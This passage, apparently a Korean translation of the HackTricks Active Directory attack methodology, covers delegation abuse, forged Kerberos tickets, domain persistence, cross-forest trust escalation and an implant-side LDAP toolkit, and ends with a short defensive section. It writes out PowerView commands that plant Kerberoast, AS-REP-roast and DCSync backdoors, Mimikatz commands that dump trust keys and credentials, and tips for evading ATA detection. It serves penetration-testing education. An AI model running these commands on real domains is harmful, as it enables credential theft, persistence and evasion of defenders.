그런 다음 이 사용자/컴퓨터의 **hash를 탈취**하면, 일부 서비스에 대해 **어떤 사용자로서든(심지어 도메인 관리자도)** 가장할 수 있습니다.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 컴퓨터의 Active Directory 객체에 대한 **WRITE** 권한을 가지면 **권한 상승된 코드 실행**을 달성할 수 있습니다:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

탈취된 사용자는 향후 **수평 이동/권한 상승**을 가능하게 하는 **도메인 객체에 대한 흥미로운 권한**을 가지고 있을 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

도메인 내에서 **Spool 서비스가 리스닝 중인 것을 발견**하면, 이는 **새 자격증명을 획득**하고 **권한을 상승**시키는 데 **악용될 수 있습니다**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**다른 사용자가** **탈취된** 머신에 **접속**하면, 메모리에서 자격증명을 **수집**하거나 그들의 프로세스에 **beacon을 주입**해 그들을 가장할 수 있습니다.\
대부분의 사용자는 RDP로 시스템에 접속하므로, 타사 RDP 세션에 대해 수행할 수 있는 몇 가지 공격 방법은 다음과 같습니다:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**는 도메인에 조인된 컴퓨터의 **로컬 Administrator 비밀번호**를 관리하는 시스템으로, 비밀번호를 **무작위화**, 고유화하고 자주 **변경**되게 합니다. 이러한 비밀번호는 Active Directory에 저장되며 접근은 ACL을 통해 권한 있는 사용자로만 제어됩니다. 이 비밀번호들에 접근할 수 있는 충분한 권한이 있다면 다른 컴퓨터로 피벗하는 것이 가능해집니다.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

탈취된 머신에서 **인증서 수집**은 환경 내 권한 상승의 방법이 될 수 있습니다:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

취약한 템플릿이 구성되어 있으면 이를 악용해 권한을 상승시킬 수 있습니다:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

일단 **Domain Admin** 또는 더 나아가 **Enterprise Admin** 권한을 얻으면, **도메인 데이터베이스**인 _ntds.dit_을 **덤프**할 수 있습니다.

[**DCSync 공격에 대한 자세한 정보는 여기에서 확인하세요**](dcsync.md).

[**NTDS.dit를 탈취하는 방법에 대한 자세한 정보는 여기에서 확인하세요**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

앞서 논의한 일부 기술들은 퍼시스턴스에 사용될 수 있습니다.\
예를 들어 다음을 수행할 수 있습니다:

- 사용자를 [**Kerberoast**](kerberoast.md)에 취약하게 만듭니다

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 사용자를 [**ASREPRoast**](asreproast.md)에 취약하게 만듭니다

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 사용자에게 [**DCSync**](#dcsync) 권한을 부여합니다

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket 공격**은 특정 서비스에 대해 합법적인 TGS 티켓을 생성하는 것으로, 예를 들어 **PC 계정의 NTLM 해시**를 사용해 **서비스 권한에 접근**하는 데 사용됩니다.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket 공격**은 공격자가 Active Directory 환경에서 **krbtgt 계정의 NTLM 해시**를 얻는 것을 포함합니다. 이 계정은 모든 **TGT**를 서명하는 데 사용되므로 AD 네트워크 내 인증에 필수적입니다.

일단 공격자가 이 해시를 얻으면, 어떤 계정에 대해서도 **TGT를 생성**할 수 있습니다 (Silver ticket 공격과 유사한 원리).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

이들은 일반적인 golden ticket 탐지 메커니즘을 **우회하도록 위조된 golden ticket과 유사한 티켓들**입니다.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

계정의 **인증서를 보유하거나 요청할 수 있다면**, 사용자가 비밀번호를 변경하더라도 해당 사용자 계정에 **영구적으로 남을 수 있는** 매우 좋은 방법입니다:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**인증서를 사용하여 도메인 내에서 높은 권한으로 퍼시스턴스하는 것**도 가능합니다:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory의 **AdminSDHolder** 객체는 **Domain Admins**, **Enterprise Admins**와 같은 **권한 그룹**의 보안을 보장하기 위해 표준 **ACL**을 적용하여 이러한 그룹에 대한 무단 변경을 방지합니다. 그러나 이 기능은 악용될 수 있으며; 공격자가 AdminSDHolder의 ACL을 수정해 일반 사용자에게 전체 접근 권한을 부여하면, 그 사용자는 모든 권한 그룹에 대한 광범위한 제어권을 얻게 됩니다. 이 보안 기능은 주의 깊게 모니터링되지 않으면 오히려 남용될 여지가 있습니다.

[**AdminDSHolder 그룹에 대한 자세한 정보는 여기에서 확인하세요.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

모든 **Domain Controller(DC)** 안에는 **로컬 관리자** 계정이 존재합니다. 해당 머신에서 관리자 권한을 얻으면, 로컬 Administrator 해시를 **mimikatz**로 추출할 수 있습니다. 이후 이 비밀번호의 사용을 **활성화**하기 위해 레지스트리 수정을 수행하면, 로컬 Administrator 계정에 원격으로 접근할 수 있게 됩니다.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

특정 도메인 객체에 대해 어떤 **사용자에게 특수 권한**을 **부여**하면, 그 사용자가 향후 **권한 상승**을 할 수 있게 됩니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors**는 객체가 다른 객체에 대해 어떤 **권한을 가지는지**를 **저장**하는 데 사용됩니다. 객체의 security descriptor에 **작은 변경**만 가해도, 해당 객체에 대해 매우 흥미로운 권한을 얻을 수 있으며 반드시 권한 있는 그룹의 멤버일 필요는 없습니다.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` 보조 클래스를 악용하여 `entryTTL`/`msDS-Entry-Time-To-Die`를 가진 단명(principal/GPO/DNS 레코드) 객체를 생성하면, 이들은 tombstone 없이 자기 삭제되어 LDAP 증거를 지우는 동시에 고아 SID, 깨진 `gPLink` 참조 또는 캐시된 DNS 응답(예: AdminSDHolder ACE 오염 또는 악성 `gPCFileSysPath`/AD-통합 DNS 리디렉션)을 남길 수 있습니다.

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

메모리 내 **LSASS**를 변경하여 **모든 도메인 계정에 대한 공통 비밀번호**를 설정하면, 모든 계정에 접근할 수 있게 됩니다.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP(Security Support Provider)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
자신의 **SSP를 만들어** 머신에 접근하는 데 사용된 **자격증명을 평문으로 캡처**할 수 있습니다.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

새로운 **Domain Controller**를 AD에 등록하고 이를 사용해 지정된 객체에 대해 SIDHistory, SPNs 등 속성을 **로그를 남기지 않고 푸시**합니다. DA 권한이 필요하며 루트 도메인 내부에 있어야 합니다.\
단, 잘못된 데이터를 사용하면 꽤 보기 안 좋은 로그들이 생성될 수 있습니다.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

앞서 LAPS 비밀번호를 읽을 수 있는 충분한 권한이 있을 때 권한 상승 방법에 대해 논의했었습니다. 그러나 이 비밀번호들은 또한 **퍼시스턴스 유지**에 사용될 수 있습니다.\
참조:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft는 **Forest**를 보안 경계로 봅니다. 이는 **하나의 도메인 침해가 전체 Forest 침해로 이어질 수 있음을 의미합니다**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 **도메인**의 사용자가 다른 **도메인**의 리소스에 접근할 수 있게 해주는 보안 메커니즘입니다. 이는 두 도메인의 인증 시스템 간의 연결을 생성하여 인증 검증이 원활하게 흐르도록 합니다. 도메인이 트러스트를 설정하면, 트러스트의 무결성에 중요한 특정 **키**를 각 도메인의 **Domain Controller(DC)**에 교환하고 보관합니다.

일반적인 시나리오에서, 사용자가 **신뢰된 도메인**의 서비스에 접근하려면 먼저 자신의 도메인 DC에서 **inter-realm TGT**라는 특별한 티켓을 요청해야 합니다. 이 TGT는 두 도메인이 합의한 공유 **키**로 암호화됩니다. 사용자는 이 TGT를 **신뢰된 도메인의 DC**에 제시하여 서비스 티켓(**TGS**)을 얻습니다. 신뢰된 도메인의 DC가 inter-realm TGT를 검증하면, 요청한 서비스에 대한 TGS를 발급하여 사용자가 서비스에 접근하도록 합니다.

**단계**:

1. **Domain 1**의 클라이언트 컴퓨터가 자신의 **NTLM hash**를 사용해 **TGT**를 요청하기 위해 **Domain Controller(DC1)**에 접근합니다.
2. 클라이언트가 성공적으로 인증되면 DC1은 새로운 TGT를 발급합니다.
3. 클라이언트는 **Domain 2**의 리소스에 접근하기 위해 DC1에 **inter-realm TGT**를 요청합니다.
4. inter-realm TGT는 두 도메인의 양방향 트러스트의 일부로서 DC1과 DC2가 공유하는 **trust key**로 암호화됩니다.
5. 클라이언트는 이 inter-realm TGT를 **Domain 2의 Domain Controller(DC2)**에 제시합니다.
6. DC2는 공유된 trust key를 사용해 inter-realm TGT를 검증하고, 유효하면 클라이언트가 접근하려는 Domain 2의 서버에 대한 **TGS**를 발급합니다.
7. 마지막으로, 클라이언트는 해당 서버에 이 TGS를 제시합니다. 이 TGS는 서버 계정 해시로 암호화되어 있으며, 이를 통해 Domain 2의 서비스에 접근할 수 있습니다.

### Different trusts

트러스트는 **단방향 또는 양방향**일 수 있음을 주목하는 것이 중요합니다. 양방향 옵션에서는 양쪽 도메인이 서로를 신뢰하지만, **단방향** 트러스트 관계에서는 한 도메인이 **trusted**이고 다른 도메인이 **trusting**입니다. 이 경우, **trusted 도메인에서 trusting 도메인의 리소스만 접근할 수 있습니다**.

Domain A가 Domain B를 신뢰하면, A는 trusting 도메인이며 B는 trusted 도메인입니다. 또한 **Domain A**에서는 이것이 **Outbound trust**가 되고, **Domain B**에서는 **Inbound trust**가 됩니다.

**다양한 트러스트 관계**

- **Parent-Child Trusts**: 동일한 포리스트 내에서 흔한 설정으로, 자식 도메인은 자동으로 부모 도메인과 양방향의 전이적 트러스트를 가집니다. 이는 부모와 자식 간에 인증 요청이 원활하게 흐를 수 있음을 의미합니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 불리며, 자식 도메인 간에 설정되어 참조 과정을 가속화합니다. 복잡한 포리스트에서는 인증 참조가 보통 포리스트 루트까지 올라갔다가 대상 도메인으로 내려가야 합니다. cross-link를 생성하면 이 경로가 단축되어 지리적으로 분산된 환경에서 특히 유용합니다.
- **External Trusts**: 서로 관련이 없는 다른 도메인 간에 설정되며 본질적으로 비전이적(non-transitive)입니다. Microsoft 문서에 따르면, external trusts는 포리스트 트러스트로 연결되지 않은 외부 도메인의 리소스에 접근하는 데 유용합니다. 보안은 external trusts에 대한 SID 필터링으로 강화됩니다.
- **Tree-root Trusts**: 포리스트 루트 도메인과 새로 추가된 트리 루트 간에 자동으로 설정되는 트러스트입니다. 흔히 접하지는 않지만, 트리 루트를 포리스트에 추가할 때 두 도메인 간의 양방향 전이성을 보장하므로 중요합니다.
- **Forest Trusts**: 두 포리스트 루트 도메인 간의 양방향 전이적 트러스트로, SID 필터링을 적용하여 보안을 강화합니다.
- **MIT Trusts**: 비-Windows의, [RFC4120-호환](https://tools.ietf.org/html/rfc4120) Kerberos 도메인과 설정되는 트러스트입니다. MIT trusts는 Windows 생태계 밖의 Kerberos 기반 시스템과 통합해야 하는 환경에 적합합니다.

#### Other differences in **trusting relationships**

- 트러스트 관계는 또한 **전이적(transitive)**일 수 있습니다 (A가 B를 신뢰하고 B가 C를 신뢰하면 A는 C를 신뢰함) 또는 **비전이적(non-transitive)**일 수 있습니다.
- 트러스트 관계는 **양방향 트러스트**(서로 신뢰)로 설정될 수도 있고 **단방향 트러스트**(한쪽만 신뢰)로 설정될 수도 있습니다.

### Attack Path

1. 신뢰 관계를 **열거**합니다
2. 어떤 **security principal**(user/group/computer)이 **다른 도메인의 리소스에 접근할 수 있는지** 확인합니다. ACE 엔트리나 다른 도메인의 그룹 멤버십으로 확인하세요. **도메인 간 관계**를 찾아보세요(아마도 트러스트가 이것을 위해 생성되었을 것입니다).
1. 이 경우 kerberoast도 또 다른 옵션이 될 수 있습니다.
3. 도메인 간 **피벗**할 수 있는 **계정들을 타깃으로 침해**합니다.

공격자는 다른 도메인의 리소스에 접근하기 위해 주로 세 가지 메커니즘을 통해 접근할 수 있습니다:

- **로컬 그룹 멤버십**: 주체가 서버의 “Administrators” 그룹과 같은 로컬 그룹에 추가될 수 있으며, 이는 해당 머신에 대한 상당한 제어권을 부여합니다.
- **외부 도메인 그룹 멤버십**: 주체가 외부 도메인의 그룹의 멤버일 수 있습니다. 하지만 이 방법의 효과성은 트러스트의 성격과 그룹의 범위에 따라 달라집니다.
- **Access Control Lists (ACLs)**: 주체가 특히 **DACL** 내 **ACE**로 지정되어 특정 리소스에 접근할 수 있게 될 수 있습니다. ACL, DACL, ACE의 메커니즘을 더 깊이 이해하고자 하는 사람들을 위해, “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”라는 백서가 매우 유용한 자료입니다.

### Find external users/groups with permissions

도메인에서 외부 보안 주체를 찾으려면 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**을 확인하세요. 이는 **외부 도메인/포리스트**의 user/group일 것입니다.

이것은 **Bloodhound**에서 확인하거나 powerview를 사용해 확인할 수 있습니다:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
도메인 신뢰 관계를 열거하는 다른 방법:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 신뢰된 키가 **2개** 있습니다. 하나는 _Child --> Parent_ 용이고 다른 하나는 _Parent_ --> _Child_ 용입니다.\
> 현재 도메인에서 사용되는 키를 확인하려면 다음을 사용하세요:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

신뢰를 악용해 SID-History injection으로 child/parent 도메인에 대해 Enterprise admin으로 권한 상승:

{{#ref}}
sid-history-injection.md
{{#endref}}

#### 쓰기 가능한 Configuration NC 악용

Configuration Naming Context (NC)을 어떻게 악용할 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 Active Directory (AD) 환경에서 포리스트 전체의 구성 데이터를 중앙에서 보관하는 저장소 역할을 합니다. 이 데이터는 포리스트 내의 모든 Domain Controller (DC)로 복제되며, 쓰기 가능한 DC는 Configuration NC의 쓰기 가능한 복사본을 유지합니다. 이를 악용하려면 **DC에서 SYSTEM 권한**(가능하면 child DC)이 필요합니다.

**Link GPO to root DC site**

Configuration NC의 Sites 컨테이너에는 AD 포리스트 내 모든 도메인 가입 컴퓨터들의 사이트 정보가 포함되어 있습니다. 어떤 DC에서든 SYSTEM 권한으로 작동하면 공격자는 GPO를 root DC 사이트에 링크할 수 있습니다. 이 동작은 해당 사이트에 적용되는 정책을 조작함으로써 루트 도메인을 잠재적으로 손상시킬 수 있습니다.

자세한 내용은 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) 연구를 참고하세요.

**Compromise any gMSA in the forest**

공격 벡터는 도메인 내 특권 gMSA를 겨냥하는 것입니다. gMSA 비밀번호를 계산하는 데 필수적인 KDS Root key는 Configuration NC에 저장됩니다. 어떤 DC에서든 SYSTEM 권한으로 KDS Root key에 접근하여 포리스트의 모든 gMSA 비밀번호를 계산할 수 있습니다.

자세한 분석 및 단계별 가이드는 다음을 참고하세요:

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

보완적 위임 MSA 공격 (BadSuccessor – 마이그레이션 속성 악용):

{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 외부 연구: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

이 방법은 새로운 특권 AD 객체가 생성될 때까지 기다리는 인내가 필요합니다. SYSTEM 권한으로 공격자는 AD Schema를 수정해 모든 클래스에 대해 임의의 사용자에게 전체 권한을 부여할 수 있습니다. 이는 새로 생성되는 AD 객체에 대한 무단 접근 및 제어로 이어질 수 있습니다.

자세한 내용은 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)를 참고하세요.

**From DA to EA with ADCS ESC5**

ADCS ESC5 취약점은 포리스트 내의 임의 사용자로 인증할 수 있는 인증서 템플릿을 생성하기 위해 Public Key Infrastructure (PKI) 객체에 대한 제어를 목표로 합니다. PKI 객체는 Configuration NC에 존재하므로, 쓰기 가능한 child DC를 침해하면 ESC5 공격을 실행할 수 있습니다.

자세한 내용은 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)를 참고하세요. ADCS가 없는 경우에도 공격자는 필요한 구성 요소를 설치할 수 있는 능력이 있으며, 이에 대해서는 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)를 참고하세요.

### 외부 포리스트 도메인 - 단방향(인바운드) 또는 양방향
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
이 시나리오에서는 **귀하의 도메인이 외부 도메인에 의해 신뢰되어** 해당 도메인에 대해 **불확정된 권한**을 부여받습니다. 귀하의 도메인 중 **어떤 프린시펄들이 외부 도메인에 대해 어떤 접근 권한을 가지고 있는지** 찾아내고 이를 악용해 보아야 합니다:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 외부 포리스트 도메인 - 일방향(아웃바운드)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
이 시나리오에서는 **귀하의 도메인**이 **다른 도메인**의 프린시플에게 일부 **권한**을 **신뢰**하고 있습니다.

하지만, 한 도메인이 신뢰되는 측(신뢰하는 도메인)에 의해 신뢰될 때, 신뢰된 도메인은 **예측 가능한 이름**을 가진 **사용자**를 생성하고 해당 사용자의 **비밀번호로 신뢰된 비밀번호**를 사용합니다. 즉, **신뢰하는 도메인의 사용자를 이용해 신뢰된 도메인에 접근**하여 이를 열거하고 추가 권한 상승을 시도할 수 있다는 뜻입니다:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

신뢰된 도메인을 침해하는 또 다른 방법은 도메인 트러스트의 **반대 방향**으로 생성된 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)를 찾는 것입니다(이는 흔하지 않습니다).

또 다른 방법은 **신뢰된 도메인의 사용자가 RDP로 로그인할 수 있는 기계에 대기**하는 것입니다. 그런 다음 공격자는 RDP 세션 프로세스에 코드를 주입하여 그곳에서 **피해자의 원래 도메인에 접근**할 수 있습니다.\
또한, **피해자가 자신의 하드 드라이브를 마운트한 경우**, 공격자는 **RDP 세션** 프로세스에서 하드 드라이브의 **startup 폴더**에 **backdoors**를 저장할 수 있습니다. 이 기법은 **RDPInception**이라고 불립니다.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 도메인 트러스트 악용 완화

### **SID Filtering:**

- SID history 속성을 활용한 포리스트 간 트러스트(forest trusts) 공격의 위험은 SID Filtering으로 완화되며, 이는 모든 inter-forest trusts에서 기본적으로 활성화되어 있습니다. 이는 Microsoft의 입장에 따라 보안 경계를 도메인이 아닌 포리스트로 간주하여 intra-forest trusts가 안전하다는 가정에 기반합니다.
- 다만 문제는, SID filtering이 애플리케이션과 사용자 접근을 방해할 수 있어 가끔 비활성화되는 경우가 있다는 점입니다.

### **Selective Authentication:**

- 포리스트 간 트러스트에 대해 Selective Authentication을 사용하면 두 포리스트의 사용자가 자동으로 인증되지 않으며, 신뢰하는 도메인/포리스트 내의 도메인 및 서버에 접근하려면 명시적인 권한 부여가 필요합니다.
- 이러한 조치들은 writable Configuration Naming Context(NC)의 악용이나 트러스트 계정에 대한 공격으로부터는 보호하지 못한다는 점을 유의해야 합니다.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)는 bloodyAD-style LDAP 프리미티브를 x64 Beacon Object Files(BOF)로 재구현하여 on-host implant(예: Adaptix C2) 내부에서 완전히 실행되도록 합니다. 운영자는 패키지를 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`로 컴파일하고, `ldap.axs`를 로드한 후 비콘에서 `ldap <subcommand>`를 호출합니다. 모든 트래픽은 현재 로그온 보안 컨텍스트를 통해 LDAP(389, signing/sealing) 또는 LDAPS(636, auto certificate trust)로 전달되므로 socks proxies나 디스크 아티팩트가 필요 없습니다.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers`는 짧은 이름/OU 경로를 전체 DN으로 해석하고 해당 객체들을 덤프합니다.
- `get-object`, `get-attribute`, and `get-domaininfo`는 임의의 속성(보안 디스크립터 포함)과 `rootDSE`의 포리스트/도메인 메타데이터를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd`는 로스팅 후보, delegation 설정, 그리고 LDAP에서 직접 존재하는 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 디스크립터를 노출합니다.
- `get-acl` and `get-writable --detailed`는 DACL을 파싱하여 트러스티(트러스티들), 권한(GenericAll/WriteDACL/WriteOwner/속성 쓰기), 상속 정보를 나열하여 ACL 권한 상승의 즉각적인 표적을 제공합니다.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 는 OU 권한이 있는 곳 어디든지 새로운 principals 또는 machine accounts 를 스테이징할 수 있게 합니다. `add-groupmember`, `set-password`, `add-attribute`, 및 `set-attribute` 는 write-property 권한이 발견되면 대상 계정을 직접 하이재킹합니다.
- ACL 중심 명령어들(`add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, 및 `add-dcsync`) 은 AD 객체의 WriteDACL/WriteOwner 권한을 비밀번호 리셋, 그룹 멤버십 제어, 또는 DCSync 복제 권한으로 변환하여 PowerShell/ADSI 아티팩트를 남기지 않고 작업을 수행합니다. `remove-*` 대응 명령어들은 주입된 ACE들을 정리합니다.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` 은 손상된 사용자를 즉시 Kerberoastable 하게 만들고; `add-asreproastable` (UAC 토글)은 비밀번호를 건드리지 않고 AS-REP roasting 대상으로 표시합니다.
- Delegation 매크로들(`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) 은 비콘에서 `msDS-AllowedToDelegateTo`, UAC 플래그, 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity` 를 재작성하여 constrained/unconstrained/RBCD 공격 경로를 가능하게 하고 원격 PowerShell 또는 RSAT 의 필요성을 제거합니다.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` 는 제어되는 principal의 SID history 에 권한 있는 SIDs 를 주입합니다 (see [SID-History Injection](sid-history-injection.md)), LDAP/LDAPS 상에서 은밀하게 권한 상속을 제공합니다.
- `move-object` 는 컴퓨터나 사용자의 DN/OU 를 변경하여 공격자가 이미 위임 권한이 있는 OU 로 자산을 끌어올 수 있게 하며, 이후 `set-password`, `add-groupmember`, 또는 `add-spn` 을 악용할 수 있습니다.
- 세밀하게 범위를 지정한 제거 명령들(`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, 등)은 운영자가 자격증명이나 지속성 정보를 수집한 후 신속히 롤백할 수 있게 하여 탐지 텔레메트리를 최소화합니다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Domain Admins 는 가능한 한 Domain Controllers 에만 로그인하도록 제한하고, 다른 호스트에서의 사용을 피하는 것이 권장됩니다.
- **Service Account Privileges**: 서비스는 보안을 위해 Domain Admin (DA) 권한으로 실행되어서는 안 됩니다.
- **Temporal Privilege Limitation**: DA 권한이 필요한 작업의 경우 그 지속 시간을 제한해야 합니다. 예: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075 를 감사하고 DCs/clients 에서 LDAP signing 과 LDAPS channel binding 을 강제하여 LDAP MITM/relay 시도를 차단합니다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Deception 구현은 덫을 설치하는 작업을 포함합니다. 예: 비활성화되지 않는 비밀번호를 가진 또는 Trusted for Delegation 로 표시된 덤마이 사용자나 컴퓨터를 만드는 것입니다. 구체적 접근법으로는 특정 권한을 가진 사용자를 생성하거나 고권한 그룹에 추가하는 것이 포함됩니다.
- 실무 예시는 다음과 같은 도구 사용을 포함합니다: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception 기법 배포에 대한 자세한 내용은 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) 에서 확인할 수 있습니다.

### **Identifying Deception**

- **For User Objects**: 의심스러운 지표로는 비정상적인 ObjectSID, 드문 로그온 빈도, 생성 일자, 낮은 bad password 카운트 등이 있습니다.
- **General Indicators**: 잠재적 덤마이 객체의 속성을 실제 객체들과 비교하면 불일치를 찾을 수 있습니다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 같은 도구가 이런 deception 식별에 도움을 줍니다.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA 탐지를 피하기 위해 Domain Controllers 에서 세션 열거를 피합니다.
- **Ticket Impersonation**: 티켓 생성에 **aes** 키를 사용하면 NTLM 으로 다운그레이드하지 않아 탐지를 회피하는 데 도움이 됩니다.
- **DCSync Attacks**: ATA 탐지를 피하기 위해 비-Domain Controller 에서 실행하는 것이 권장됩니다. Domain Controller 에서 직접 실행하면 경보가 발생합니다.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
